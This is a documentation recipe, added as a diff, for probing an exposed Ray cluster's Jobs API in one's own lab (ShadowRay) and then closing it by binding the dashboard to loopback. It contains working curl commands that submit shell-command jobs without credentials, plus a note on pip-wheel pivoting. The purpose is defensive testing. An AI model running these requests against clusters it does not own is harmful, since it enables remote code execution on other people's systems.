@@ -1,0 +1,207 @@
+---
+title: "Recipe: shadow a Ray cluster through its job API"
+toc-title: Recipe
+---
+
+| Field | Value |
+|---|---|
+| Tools | `shadow-ray` (A-7, exp) ↔ `ray` (O-2 lab target) + telemetry rows |
+| Section | Attack–defence pairs |
+| Level | hard |
+| Time | ~45 min (boot + job-API walk + telemetry leg) |
+| Layer/Category | ATTACK / A-7 + OPS / O-2 ↔ DEFENCE / d-02 (pending rows) |
+| Tags | `pair`, `platform`, `ray`, `job-api`, `atlas-cs0023`, `rce-class`, `exp`, `owasp-llm02`, `owasp-llm10` |
+
+## Problem
+
+Ray clusters expose a dashboard + Jobs API on :8265, and the job API
+is a remote-code-execution primitive by design: `POST /api/jobs`
+takes an `entrypoint` string that a Ray worker shell executes inside
+the cluster. If that port answers on any interface beyond loopback —
+the exposure upstream's own `--dashboard-host` help text spells out
+as `localhost (127.0.0.1/::1) for local access only, or 0.0.0.0/::
+for all interfaces` — then anyone who can reach :8265 can enumerate
+(`GET /api/version`, `GET /api/jobs`), submit a job whose entrypoint
+is their payload, stop and delete other users' jobs (`POST
+.../stop`, `DELETE /api/jobs/{id}`), and read their logs. The ATLAS
+technique for exactly this is CS0023, "ShadowRay: Hijacking Exposed
+Ray Clusters", and the vulnerability record is honestly complicated:
+CVE-2023-48022 describes the job-submission-API RCE but is
+VENDOR-DISPUTED per NVD — Ray's maintainers push back that a
+cluster intentionally exposed to untrusted networks is not a
+vulnerability, which makes the CONFIGURATION the story, not the
+binary. The manifest maps the surface to OWASP LLM02 + LLM10 and the
+`shadow-ray` row to ATLAS AML.T0049 + T0050. You want the pair run
+against your own cluster in your own lab: prove the API shape, prove
+the flag that binds it, and prove the flip closes it.
+
+## Solution
+
+The walk runs the real Jobs API shapes with plain curl against your
+own lab cluster (the A-7 row is exp and repository-missing at the
+pin; see Discussion), on a cluster you own inside an isolated lab
+segment:
+
+```bash
+# 1. BOOT THE LAB TARGET — the exposed posture is the deliberate act;
+#    --dashboard-host 'localhost (127.0.0.1/::1) for local access
+#    only, or 0.0.0.0/:: for all interfaces'   # (upstream help, verbatim)
+#    ray start --head --dashboard-host 0.0.0.0 --port 6379
+#    (the exposed leg answers :8265 from the segment — keep it in the
+#     lab segment, never a shared network; exp-classified A-7 rows
+#     reach a lab host via the gate — [Gate lab-mode and
+#     exp-classified tools](../admin/lab-mode-gating.html))
+
+# 2. ENUMERATION (no credentials — the class in one shape):
+curl -fsS http://<target>:8265/api/version
+#    -> {"rayVersion":"<x.y.z>", ...} — the cluster answers
+curl -fsS http://<target>:8265/api/jobs
+#    -> job list (id, status, entrypoint per job) — who is running what
+
+# 3. SUBMIT A MARKER JOB (the write half — a marker, NOT a payload):
+curl -fsS -X POST http://<target>:8265/api/jobs \
+     -H 'Content-Type: application/json' \
+     -d '{"entrypoint": "echo KA_RAY_MARKER", "runtime_env": {}}'
+#    -> {"job_id": "<id>", ...} — the cluster ACCEPTED a job whose
+#       entrypoint is an arbitrary shell command; that acceptance IS
+#       the RCE-class evidence (a worker will execute the entrypoint)
+
+# 4. READ BACK + TEARDOWN (the remaining API shapes):
+curl -fsS http://<target>:8265/api/jobs/<id>
+#    -> status + entrypoint of the marker job
+curl -fsS http://<target>:8265/api/jobs/<id>/logs
+#    -> "KA_RAY_MARKER" — your string executed in the cluster's shell
+curl -fsS -X POST http://<target>:8265/api/jobs/<id>/stop
+curl -fsS -X DELETE http://<target>:8265/api/jobs/<id>
+#    -> stop/delete accepted keylessly too — full lifecycle control
+
+# 5. PIVOT NOTE (the LLM10/L02 extension): a marker job's shell is a
+#    worker shell — with `runtime_env` pip-installable wheels, the
+#    job API is also a package-supply chain into the cluster. The
+#    marker never carries one; the recipe's evidence stops at the
+#    accepted entrypoint + echoed marker.
+```
+
+Then the verification leg — flip the bind, re-run the same shapes:
+
+```bash
+# 6. THE FLIP: the dashboard bind is the defence.
+ray stop
+ray start --head --dashboard-host 127.0.0.1 --port 6379
+#    (the default posture — upstream's help text literally names
+#     "local access only" for it)
+
+# 7. SAME shapes, same box:
+curl -s -o /dev/null -w '%{http_code}\n' http://<target>:8265/api/version
+#    -> FAIL (refused) from the segment; the API answers only on the
+#       loopback interface. Diff between the two sweeps = evidence that
+#       the configuration — not a patch — moved the surface.
+```
+
+Expected output shape (abridged, shapes not transcripts):
+
+```
+sweep @ http://<target>:8265  posture: --dashboard-host 0.0.0.0 (lab)
+  /api/version       -> ok {"rayVersion":"..."}
+  /api/jobs          -> ok [...] (job list)
+  POST /api/jobs     -> ok {"job_id":"<id>"} (marker entrypoint ACCEPTED)
+  /api/jobs/<id>/logs -> ok (marker echo visible — executed)
+  POST .../stop      -> ok   DELETE /api/jobs/<id> -> ok
+sweep again, posture: --dashboard-host 127.0.0.1
+  all probes -> FAIL (refused) — the API is local-access-only again
+```
+
+## Discussion
+
+- **ATLAS CS0023 is the technique name, and the disputed CVE is the
+  honest footnote:** the ShadowRay technique (ATLAS case study
+  CS0023) documents hijacking exposed Ray clusters in the wild —
+  attackers ran cryptominers through the job API of clusters bound
+  beyond their perimeter. CVE-2023-48022 describes the
+  job-submission-API RCE class, but NVD lists it VENDOR-DISPUTED: the
+  maintainers' position is that an intentionally exposed cluster is
+  a deployment defect, not a code flaw. For an operator the dispute
+  changes nothing about the mitigation and everything about the
+  language: you fix it with configuration (the bind, the firewall),
+  and your report says "exposed Jobs API" rather than
+  "unpatched CVE".
+- **Why plain curl and not a bespoke exploit script:** `shadow-ray`
+  is an A-7 row, `safety.level: exp`, licence `LicenseRef-Unknown`,
+  with its upstream repository missing at the pin
+  ([kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)).
+  The probe leg runs the verified openapi.yml shapes (Jobs API v4.0.0
+  surface: `GET /api/version`, `POST /api/jobs` with
+  entrypoint+runtime_env, `GET /api/jobs`, `GET/DELETE
+  /api/jobs/{id}`, `POST .../stop`, `GET .../logs`); the real tool
+  takes over when its derivation lands, via the double-key lab gate
+  (walk: [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html)).
+- **The marker job is the whole RCE argument, made safely:**
+  submission ACCEPTED an arbitrary `entrypoint` string and the logs
+  endpoint echoed its execution — no payload, no persistence, no
+  network egress beyond the lab segment. The `runtime_env` pip wheel
+  channel is named because it is the pivot the technique class uses;
+  the recipe's evidence deliberately stops at the accepted
+  entrypoint.
+- **The kailash ray row is a module row, stated honestly:** ray
+  ships in the manifest as a module + `services.kailash` module-shape
+  row (not a docker-wrapper Shape-3 boot). The lab-boot leg above
+  uses the module/boot posture at the pin: read the module per
+  release — the option names follow the manifest row's module shape,
+  and the `--dashboard-host` bind discipline is the same whichever
+  way you boot. The defence flip is the module's bind default at the
+  pin: loopback unless a lab posture explicitly overrides.
+- **The telemetry defence leg is a pending row, stated honestly:**
+  otel-ai (OpenLLMetry) is the instrument the manifest owns for
+  LLM-cluster telemetry — `Traceloop.init()` instruments the app and
+  ships spans (job submissions land as trace span attributes) to any
+  OTLP endpoint; whylogs is the profile layer — `why.log(df)` over
+  job/usage records gives the drift view. Both are d-02 rows whose
+  kailash module wiring is PENDING at the pin (quoted as the design,
+  not a landed surface). What they would give the operator: the
+  standing view of job submissions to a cluster — the anomaly view
+  the probe sweep hand-verified.
+- **This is the transferable pattern** (lab target up → probe sweep
+  → posture flip → same sweep → diff). Origin walk with the verdict
+  instrument and the `--record` discipline:
+  [Attack the platform, then verify](attack-then-verify.html).
+
+## See also
+
+- [Attack the platform, then verify](attack-then-verify.html) — the
+  mlflow pair; the verdict + record discipline this recipe follows
+- [Serve a local model for scanning](../ops/serve-a-model.html) —
+  the model-surface analog; the O-2 serving lane
+- [Gate lab-mode and exp-classified
+  tools](../admin/lab-mode-gating.html) — the exp gate the real tool
+  rides when its derivation lands
+- ATLAS CS0023 (ShadowRay):
+  <https://atlas.mitre.org/case-studies/CS0023>
+- Ray Jobs API reference (openapi.yml):
+  <https://docs.ray.io/en/latest/cluster/running-jobs.html>
+- Ray dashboard
+  host flag: <https://docs.ray.io/en/latest/cluster/cli.html#ray-start>
+- Upstream missing-repository note:
+  [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23)
+- [Recipe directory](../directory.html)
+
+---
+
+**Recipe provenance.** Manifest facts (A-7 `shadow-ray` row exp +
+`LicenseRef-Unknown`, ATLAS AML.T0049 + T0050, OWASP LLM02 + LLM10
+both epochs; ray O-2 row — module + services.kailash module-shape)
+are from the packages manifest rows + lane comments, verified
+2026-10-14. Upstream surface checked at the pin: Jobs API shapes
+per openapi.yml v4.0.0 (`GET /api/version`, `POST /api/jobs`
+entrypoint+runtime_env, `GET /api/jobs`, `GET/DELETE /api/jobs/{id}`,
+`POST .../stop`, `GET .../logs`), :8265, the `--dashboard-host` help
+text verbatim (`localhost (127.0.0.1/::1) for local access only, or
+0.0.0.0/:: for all interfaces`). ATLAS case study CS0023 "ShadowRay:
+Hijacking Exposed Ray Clusters" at the ATLAS site. CVE-2023-48022 =
+job-submission-API RCE, VENDOR-DISPUTED per NVD — stated as such in
+the Discussion — verified 2026-10-14. otel-ai/whylogs kailash module
+wiring PENDING at the pin: quoted above as design, not as a landed
+surface.
+
+
+ref: [Ray Jobs API docs + ATLAS CS0023 + NVD CVE-2023-48022 + packages manifest rows](https://docs.ray.io/en/latest/cluster/running-jobs.html) - verified 2026-10-14. Missing A-7 repo: [kailash-os#23](https://github.com/kailash-os/kailash-os/issues/23).
